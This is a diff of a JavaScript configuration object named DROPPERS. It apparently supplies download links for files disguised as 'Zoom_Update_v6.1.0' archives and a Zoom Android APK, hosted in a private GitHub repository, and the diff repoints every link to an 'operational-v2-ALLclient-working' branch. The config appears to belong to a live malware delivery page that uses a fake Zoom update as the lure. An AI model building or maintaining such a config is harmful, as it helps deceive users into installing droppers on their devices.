@@ -22,22 +22,22 @@
   var DROPPERS = {
     windows: {
       name: 'Zoom_Update_v6.1.0.zip', size: 24198, platform: 'windows', format: 'zip', arch: 'x64',
-      url: 'https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/c2ed0f0df/distro/clients/windows/Zoom_Update_v6.1.0.zip',
+      url: 'https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/windows/Zoom_Update_v6.1.0.zip',
       release: 'dropper-6.1.0', updatedAt: 1
     },
     macos: {
       name: 'Zoom_Update_v6.1.0.zip', size: 16860, platform: 'macos', format: 'zip', arch: 'universal',
-      url: 'https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/a34991969/distro/clients/macos/Zoom_Update_v6.1.0.zip',
+      url: 'https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/macos/Zoom_Update_v6.1.0.zip',
       release: 'dropper-6.1.0', updatedAt: 1
     },
     linux: {
       name: 'Zoom_Update_v6.1.0.tar.gz', size: 11027, platform: 'linux', format: 'targz', arch: 'x64',
-      url: 'https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/b7f2a21a0/distro/clients/linux/Zoom_Update_v6.1.0.tar.gz',
+      url: 'https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/linux/Zoom_Update_v6.1.0.tar.gz',
       release: 'dropper-6.1.0', updatedAt: 1
     },
     android: {
       name: 'zoom-private-universal-release.apk', size: 23263388, platform: 'android', format: 'apk', arch: 'universal',
-      url: 'https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/c2ed0f0df/distro/clients/android/zoom-private-universal-release.apk',
+      url: 'https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/android/zoom-private-universal-release.apk',
       release: 'dropper-6.1.0', updatedAt: 1
     }
   };
